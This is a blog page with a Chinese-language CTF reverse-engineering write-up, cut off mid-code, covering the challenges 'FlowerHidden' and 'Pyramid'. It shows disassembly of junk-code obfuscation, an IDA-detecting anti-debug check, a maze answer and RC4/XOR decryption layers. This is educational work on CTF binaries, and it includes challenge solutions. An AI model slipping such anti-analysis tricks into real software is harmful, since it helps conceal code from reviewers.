<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>xrivendell7&#39;s ctf blog（佩奇小屋）</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta property="og:type" content="website">
<meta property="og:title" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="xrivendell7">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.1.1"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">xrivendell7&#39;s ctf blog（佩奇小屋）</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-n1ctfjunior-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/11/18/n1ctfjunior-re/" class="article-date">
  <time class="dt-published" datetime="2025-11-18T03:04:13.000Z" itemprop="datePublished">2025-11-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/11/18/n1ctfjunior-re/">n1ctfjunior-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="FlowerHidden"><a href="#FlowerHidden" class="headerlink" title="FlowerHidden"></a>FlowerHidden</h2><p>32位ida查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">_main           proc near               ; CODE XREF: __scrt_common_main_seh(void)+F5↓p</span><br><span class="line"></span><br><span class="line">argc            = dword ptr  8</span><br><span class="line">argv            = dword ptr  0Ch</span><br><span class="line">envp            = dword ptr  10h</span><br><span class="line"></span><br><span class="line">; FUNCTION CHUNK AT .text:00402460 SIZE 00000003 BYTES</span><br><span class="line"></span><br><span class="line">                push    ebp</span><br><span class="line">                mov     ebp, esp</span><br><span class="line">                push    offset sub_401020</span><br><span class="line">                push    offset sub_402850</span><br><span class="line">                push    offset sub_4012F0</span><br><span class="line">                push    offset sub_401330</span><br><span class="line">                push    offset sub_402480</span><br><span class="line">                push    offset loc_402810</span><br><span class="line">                push    offset sub_401350</span><br><span class="line">                push    offset sub_401360</span><br><span class="line">                push    offset sub_401300</span><br><span class="line">                push    offset sub_4012B0</span><br><span class="line">                push    offset sub_402890</span><br><span class="line">                push    offset loc_402FB0</span><br><span class="line">                push    offset sub_402490</span><br><span class="line">                push    offset sub_4012E0</span><br><span class="line">                push    offset sub_402840</span><br><span class="line">                push    offset sub_402450</span><br><span class="line">                push    offset sub_402430</span><br><span class="line">                push    offset sub_401340</span><br><span class="line">                push    offset sub_401050</span><br><span class="line">                push    offset sub_401040</span><br><span class="line">                push    offset sub_4028C0</span><br><span class="line">                push    offset sub_402440</span><br><span class="line">                push    offset loc_401000</span><br><span class="line">                push    offset sub_4012A0</span><br><span class="line">                push    offset sub_4028A0</span><br><span class="line">                push    offset sub_402420</span><br><span class="line">                push    offset sub_402880</span><br><span class="line">                push    offset sub_401320</span><br><span class="line">                push    offset sub_401310</span><br><span class="line">                push    offset sub_4012C0</span><br><span class="line">                push    offset sub_401030</span><br><span class="line">                push    offset sub_402860</span><br><span class="line">                push    offset sub_402410</span><br><span class="line">                push    offset sub_401010</span><br><span class="line">                push    offset sub_402830</span><br><span class="line">                push    offset sub_402820</span><br><span class="line">                push    offset sub_402870</span><br><span class="line">                push    offset sub_4012D0</span><br><span class="line">                push    offset sub_4028B0</span><br><span class="line">                push    offset loc_402460</span><br><span class="line">                retn</span><br><span class="line">_main           endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                pop     ebp</span><br><span class="line">                retn</span><br></pre></td></tr></table></figure>

<p>进入main有花指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00402FB0 loc_402FB0:                             ; DATA XREF: _main+3A↓o</span><br><span class="line">.text:00402FB0                 cmp     eax, 4</span><br><span class="line">.text:00402FB3                 jz      short locret_402FBA</span><br><span class="line">.text:00402FB5                 call    loc_402A60</span><br><span class="line">.text:00402FBA</span><br><span class="line">.text:00402FBA locret_402FBA:                          ; CODE XREF: .text:00402FB3↑j</span><br><span class="line">.text:00402FBA                 retn</span><br><span class="line">.text:00402FBA ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00402FBB                 align 10h</span><br></pre></td></tr></table></figure>

<p>去看loc_402A60</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00402A7A                 mov     eax, 1</span><br><span class="line">.text:00402A7F                 imul    ecx, eax, 3</span><br><span class="line">.text:00402A82                 movsx   edx, byte_420100[ecx]</span><br><span class="line">.text:00402A89                 push    edx</span><br><span class="line">.text:00402A8A                 call    sub_4023E0</span><br></pre></td></tr></table></figure>

<p>从表 <code>byte_420100</code> 读取值，传入 <code>sub_4023E0</code>，ecx&#x3D;3，imul有符号整数乘法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.data:00420100 byte_420100     db 0                    ; DATA XREF: sub_401D80+63B↑o</span><br><span class="line">.data:00420100                                         ; sub_4024A0+4F↑r ...</span><br><span class="line">.data:00420101                 db    1</span><br><span class="line">.data:00420102                 db    2</span><br><span class="line">.data:00420103                 db    3</span><br><span class="line">.data:00420104                 db    4</span><br><span class="line">.data:00420105                 db    5</span><br><span class="line">.data:00420106                 db    6</span><br><span class="line">.data:00420107                 db    7</span><br></pre></td></tr></table></figure>

<p>byte_420100取值范围0~7</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.text:004023E0 sub_4023E0      proc near               ; CODE XREF: sub_4024A0+57↓p</span><br><span class="line">.text:004023E0                                         ; sub_4024A0+7A↓p ...</span><br><span class="line">.text:004023E0</span><br><span class="line">.text:004023E0 arg_0           = dword ptr  4</span><br><span class="line">.text:004023E0</span><br><span class="line">.text:004023E0                 mov     ebx, [esp+arg_0]</span><br><span class="line">.text:004023E4                 mov     eax, 0Ah</span><br><span class="line">.text:004023E9                 mov     ecx, ebx</span><br><span class="line">.text:004023EB                 not     eax</span><br><span class="line">.text:004023ED                 and     ebx, eax</span><br><span class="line">.text:004023EF                 not     eax</span><br><span class="line">.text:004023F1                 not     ecx</span><br><span class="line">.text:004023F3                 and     ecx, eax</span><br><span class="line">.text:004023F5                 or      ebx, ecx</span><br><span class="line">.text:004023F7                 inc     ebx</span><br><span class="line">.text:004023F8                 dec     ebx</span><br><span class="line">.text:004023F9                 mul     ebx</span><br><span class="line">.text:004023FB                 div     ebx</span><br><span class="line">.text:004023FD                 xor     ebx, eax</span><br><span class="line">.text:004023FF                 add     [esp+0], ebx</span><br><span class="line">.text:00402402                 retn    4</span><br><span class="line">.text:00402402 sub_4023E0      endp</span><br></pre></td></tr></table></figure>

<p>简化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sub_4023E0:</span><br><span class="line">    mov     ebx, [esp+4]       ; ebx = arg</span><br><span class="line">    mov     eax, 0Ah           ; eax = 10</span><br><span class="line">    mov     ecx, ebx           ; ecx = arg</span><br><span class="line">    not     eax                ; eax = ~10</span><br><span class="line">    and     ebx, eax           ; ebx = arg &amp; ~10</span><br><span class="line">    not     eax                ; eax = 10</span><br><span class="line">    not     ecx                ; ecx = ~arg</span><br><span class="line">    and     ecx, eax           ; ecx = ~arg &amp; 10</span><br><span class="line">    or      ebx, ecx           ; ebx = (arg &amp; ~10) | (~arg &amp; 10)</span><br></pre></td></tr></table></figure>

<p><code>(arg &amp; ~mask) | (~arg &amp; mask)</code> 这个表达式是按位选择：当 <code>mask</code> 位为 1 时取原式&#x3D;<code>~arg</code> ，为 0 时原式&#x3D; <code>arg</code> 的那一位。代数上等价于 <code>arg ^ mask</code>（异或）。</p>
<p>本题mask&#x3D;0xA(10)，所以ebx&#x3D;arg^0xA。</p>
<p> inc指令用于将一个寄存器的值加1，dec指令用于将一个寄存器的值减1。</p>
<p>当前ebx&#x3D;arg^0xA，eax&#x3D;10</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mul     ebx                ; EDX:EAX = 10 * (arg^0xA)</span><br><span class="line">div     ebx                ;(10 * (arg^0xA))/(arg^0xA)</span><br><span class="line">xor     ebx, eax           ; ebx = EBX ^ 10</span><br><span class="line">add     [esp+0], ebx       ; *(DWORD*)(esp) += ebx   &lt;-- 修改返回地址</span><br><span class="line">ret     4</span><br></pre></td></tr></table></figure>

<p>div这里，如果(arg^0xA)!&#x3D;0，ebx &#x3D; (arg^0xA) ^ 10&#x3D;arg</p>
<p>到此这一长段乘除只是把 <code>ebx</code> 恢复为原始输入 <code>arg</code> ，是花指令</p>
<p>add这里，<code>esp+0</code> 是栈顶 <strong>返回地址</strong>（函数被调用时的 <code>ret</code> 地址）。因此它 <strong>把 <code>arg</code> 加到返回地址上</strong>（即修改返回地址，使得 <code>ret</code> 返回到 <code>return_address + arg</code>）。</p>
<p>[ ]取地址</p>
<table>
<thead>
<tr>
<th>平台 &#x2F; ABI</th>
<th>参数 1</th>
<th>参数 2</th>
<th>参数 3</th>
<th>参数 4</th>
<th>参数 5+</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td><strong>x86 (32位, cdecl&#x2F;stdcall)</strong></td>
<td><code>[esp+4]</code></td>
<td><code>[esp+8]</code></td>
<td><code>[esp+0xC]</code></td>
<td><code>[esp+0x10]</code></td>
<td>继续往上递增</td>
<td>所有参数都压栈；<code>[esp]</code> 是返回地址</td>
</tr>
<tr>
<td><strong>Windows x64 (MSVC ABI)</strong></td>
<td><code>RCX</code></td>
<td><code>RDX</code></td>
<td><code>R8</code></td>
<td><code>R9</code></td>
<td><code>[rsp+0x28]</code> 开始</td>
<td>栈上预留 32 字节 shadow space (<code>rsp+20h</code> 到 <code>rsp+40h</code>)，即使没用</td>
</tr>
<tr>
<td><strong>System V AMD64 (Linux, macOS, BSD)</strong></td>
<td><code>RDI</code></td>
<td><code>RSI</code></td>
<td><code>RDX</code></td>
<td><code>RCX</code></td>
<td><code>R8</code></td>
<td><code>R9</code></td>
</tr>
</tbody></table>
<p>sub_402A60，两次输入，第二次输入会被switch四个方向</p>
<p>迷宫终点是38，移动42次，累加和为117</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">64  49  49  49  49  49  48  48  48  48  49   0</span><br><span class="line">48  48  48  49  48  48  48  49  49  48  49   0</span><br><span class="line">49  49  48  49  48  49  48  48  49  48  49   0</span><br><span class="line">49  49  48  48  48  49  49  48  48  48  49   0</span><br><span class="line">49  49  48  49  49  48  48  48  49  49  49   0</span><br><span class="line">49  49  48  49  49  48  49  49  49  49  49   0</span><br><span class="line">49  48  48  48  48  48  49  49  49  49  49   0</span><br><span class="line">49  48  49  49  49  48  48  49  48  48  48   0</span><br><span class="line">49  48  48  48  49  49  48  48  48  49  48   0</span><br><span class="line">49  49  49  48  49  49  48  49  49  49  48   0</span><br><span class="line">49  49  49  48  48  48  48  48  48  48  38   0</span><br><span class="line">49  49  49  49  49  49  49  49  49  49  49   0</span><br></pre></td></tr></table></figure>

<p>sddssddwwddsdssaassaaaassddssdddwwddwddsss，程序验证通过，但是不是flag。发现ipu文件还没有使用，而且第一个输入也没被使用。</p>
<p>关注迷宫的第一个输入，注意到这里是有一个指针指向第一次输入的，看这个指针的交叉引用，可以看到一个验证和分发程序。</p>
<p>sub_1D80</p>
<p>首先，读入了1pmoluy.ipu文件，经过文件名解码，文件读入与解码。然后得到 4 个指针，分别指向不同解密后函数的入口。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)dword_420FB0 = Buffer;</span><br><span class="line">qmemcpy(v16, &quot;FUNC&quot;, sizeof(v16));</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 4) = *(_DWORD *)dword_420FB0 + sub_401AC0(*(_DWORD *)dword_420FB0, v16, v13);</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 8) = *(_DWORD *)(dword_420FB0 + 4) + sub_401AC0(*(_DWORD *)(dword_420FB0 + 4), v16, v13);</span><br><span class="line"></span><br><span class="line">*(_DWORD *)(dword_420FB0 + 12) = *(_DWORD *)(dword_420FB0 + 8) + sub_401AC0(*(_DWORD *)(dword_420FB0 + 8), v16, v13);</span><br></pre></td></tr></table></figure>

<p>对比父进程名字的前 3 个字节。如果不匹配，<code>byte_420100[6] = 10;</code> → 改变全局控制流。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">String2 = &#123; -26, -21, -18, -113 &#125;;</span><br><span class="line">for (m=0; m&lt;4; m++) String2[m] ^= 0x8F;</span><br><span class="line">_strnicmp(String1, String2, 3)</span><br></pre></td></tr></table></figure>

<p>strings2单字节异或得到字符串”ida”，如果父进程是 IDA，则会把 <code>byte_420100[6]</code> 设为 10。</p>
<p>sub_2790，异常处理函数，这里又改成了1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __usercall sub_402790@&lt;eax&gt;(int a1@&lt;ebp&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  if ( *(_DWORD *)(a1 + 0x10) == 2 )</span><br><span class="line">  &#123;</span><br><span class="line">    ++**(_DWORD **)(a1 + 8);</span><br><span class="line">    byte_420100[6] = 1;</span><br><span class="line">    *(_DWORD *)(a1 - 28) = sub_401370;</span><br><span class="line">    dword_420FC0 = *(_DWORD *)(a1 - 28);</span><br><span class="line">    __asm &#123; retn &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(a1 - 36) = 0;</span><br><span class="line">  *(_DWORD *)(a1 - 4) = -2;</span><br><span class="line">  return *(_DWORD *)(a1 - 36);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在反调试的函数中，调用了1pmoluy.ipu文件。文件中存储的是四个加密函数，经过解密后会被后面分发函数进行调用。然后根据路径进行顺序解密。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int __usercall sub_401370@&lt;eax&gt;(int a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  dword_420FB8 = a1;</span><br><span class="line">  if ( a1 == 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    (*(void (__cdecl **)(char *))dword_420FB0)(off_420234);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    switch ( dword_420FB8 )</span><br><span class="line">    &#123;</span><br><span class="line">      case 2:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 4))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      case 3:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 8))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      case 4:</span><br><span class="line">        (*(void (__cdecl **)(char *))(dword_420FB0 + 12))(off_420234);</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        return dword_420FB8;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401210();</span><br><span class="line">  return dword_420FB8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>加密1 异或 左循环位移 异或 右循环位移<br>加密2 固定key生成固定box和对应固定key 这里dump其实就行<br>加密3 这里把boxdump下来试两下就会发现 这里仅仅是实现了加减法<br>加密4 根据key生成随机顺序换序 也可以dump下来然后固定换回来就行</p>
<h2 id="Pyramid"><a href="#Pyramid" class="headerlink" title="Pyramid"></a>Pyramid</h2><p>chal.pyc -&gt; pyramid.pyd -&gt; a_long_way_to_treasure() -&gt;  pyramid.pyc（异或）   -&gt;  checkinput.pyd(rc4)  -&gt; 白盒aes解flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: chal.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.12.0rc2 (3531)</span></span><br><span class="line"><span class="comment"># Source timestamp: 1970-01-01 00:00:00 UTC (0)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pyramid</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">text = <span class="string">&#x27;A pyramid fortified with intricate defenses looms before you. \nIts secrets are locked behind layers of puzzles. \nYou stand at its base, challenged to unravel them all.&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;･････････････････････････････････････････････････････････････････&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> text.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;  <span class="subst">&#123;line&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;･････････････････････････････････････････････････････････････････&#x27;</span>)</span><br><span class="line">pyramid.a_long_way_to_treasure()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    os.remove(<span class="string">&#x27;checkinput.pyd&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p><img src="/1763435137247-6.png" alt="img"></p>
<p><img src="/1763435137193-1.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">.rdata:0000000180008280 unk_180008280   db 0A9h                 ; DATA XREF: .rdata:0000000180007F80↑o</span><br><span class="line">.rdata:0000000180008281                 db  6Ch ; l</span><br><span class="line">.rdata:0000000180008282                 db  63h ; c</span><br><span class="line">.rdata:0000000180008283                 db  6Dh ; m</span><br><span class="line">.rdata:0000000180008284                 db  64h ; d</span><br><span class="line">.rdata:0000000180008285                 db  72h ; r</span><br><span class="line">.rdata:0000000180008286                 db  65h ; e</span><br><span class="line">.rdata:0000000180008287                 db  61h ; a</span><br><span class="line">.rdata:0000000180008288                 db  2Bh ; +</span><br><span class="line">.rdata:0000000180008289                 db  30h ; <span class="number">0</span></span><br><span class="line">.rdata:000000018000828A                 db 0B5h</span><br><span class="line">.rdata:000000018000828B                 db  1Bh</span><br><span class="line">.rdata:000000018000828C                 db 0BDh</span><br><span class="line">.rdata:000000018000828D                 db  0Ch</span><br><span class="line">.rdata:000000018000828E                 db  6Bh ; k</span><br><span class="line">.rdata:000000018000828F                 db  6Fh ; o</span><br><span class="line">.rdata:0000000180008290                 db  81h</span><br><span class="line">.rdata:0000000180008291                 db  61h ; a</span><br><span class="line">.rdata:0000000180008292                 db  6Eh ; n</span><br><span class="line">.rdata:0000000180008293                 db  67h ; g</span><br><span class="line">.rdata:0000000180008294                 db  64h ; d</span><br><span class="line">.rdata:0000000180008295                 db  72h ; r</span><br><span class="line">.rdata:0000000180008296                 db  65h ; e</span><br><span class="line">.rdata:0000000180008297                 db  61h ; a</span><br><span class="line">.rdata:0000000180008298                 db  6Dh ; m</span><br><span class="line">.rdata:0000000180008299                 db  69h ; i</span><br><span class="line">.rdata:000000018000829A                 db  74h ; t</span><br><span class="line">.rdata:000000018000829B                 db  73h ; s</span><br><span class="line">.rdata:000000018000829C                 db  6Dh ; m</span><br><span class="line">.rdata:000000018000829D                 db  71h ; q</span><br><span class="line">.rdata:000000018000829E                 db  67h ; g</span><br><span class="line">.rdata:000000018000829F                 db  6Fh ; o</span><br><span class="line">.rdata:00000001800082A0                 db  62h ; b</span><br><span class="line">.rdata:00000001800082A1                 db  61h ; a</span><br><span class="line">.rdata:00000001800082A2                 db  6Eh ; n</span><br><span class="line">.rdata:00000001800082A3                 db  67h ; g</span><br><span class="line">.rdata:00000001800082A4                 db  64h ; d</span><br></pre></td></tr></table></figure>

<p><img src="/1763435137193-2.png" alt="img"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Decompiled with PyLingual (https://pylingual.io)</span></span><br><span class="line"><span class="comment"># Internal filename: layer2.py</span></span><br><span class="line"><span class="comment"># Bytecode version: 3.12.0rc2 (3531)</span></span><br><span class="line"><span class="comment"># Source timestamp: 2025-09-10 10:56:06 UTC (1757501766)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> wintypes</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> importlib.util</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BUF</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [(<span class="string">&#x27;Length&#x27;</span>, wintypes.ULONG), (<span class="string">&#x27;Unused&#x27;</span>, wintypes.ULONG), (<span class="string">&#x27;Ptr&#x27;</span>, ctypes.c_void_p)]</span><br><span class="line">key = <span class="built_in">input</span>(<span class="string">&#x27;Input your key: &#x27;</span>)</span><br><span class="line">tmp = <span class="number">2166136261</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> key:</span><br><span class="line">    tmp = <span class="number">16777619</span> * (tmp ^ <span class="built_in">ord</span>(ch)) &amp; <span class="number">4294967295</span></span><br><span class="line">key_bytes = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, tmp)</span><br><span class="line">advapi32 = ctypes.WinDLL(<span class="string">&#x27;advapi32&#x27;</span>, use_last_error=<span class="literal">True</span>)</span><br><span class="line">SystemFunction033 = advapi32.SystemFunction033</span><br><span class="line">FNPROTO = ctypes.WINFUNCTYPE(<span class="literal">None</span>, ctypes.POINTER(BUF), ctypes.POINTER(BUF))</span><br><span class="line">fn = FNPROTO(ctypes.cast(SystemFunction033, 